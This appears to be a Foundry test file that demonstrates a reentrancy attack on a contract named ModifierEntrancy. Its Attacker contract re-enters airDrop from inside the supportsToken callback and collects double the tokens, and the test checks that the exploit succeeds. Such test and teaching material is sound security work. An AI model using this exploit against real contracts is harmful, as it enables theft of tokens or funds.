
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        uint256 initialBalance = _contractUnderTest.tokenBalance(address(_attacker));
        assertEq(initialBalance, 0, "Attacker should start with 0 balance");
        
        _attacker.attack();
        
        uint256 finalBalance = _contractUnderTest.tokenBalance(address(_attacker));
        assertEq(finalBalance, 40, "Attacker should have 40 tokens (double the expected 20)");
    }
}

contract Attacker {
    ModifierEntrancy public _victim;
    bool public exploitSucceeded;
    bool private hasBeenCalled;

    constructor(address victimAddress) { 
        _victim = ModifierEntrancy(victimAddress);
    }

    function attack() public {
        exploitSucceeded = false;
        hasBeenCalled = false;
        
        _victim.airDrop();
        
        uint256 finalBalance = _victim.tokenBalance(address(this));
        if (finalBalance == 40) {
            exploitSucceeded = true;
        }
    }

    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            _victim.airDrop();
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }
}
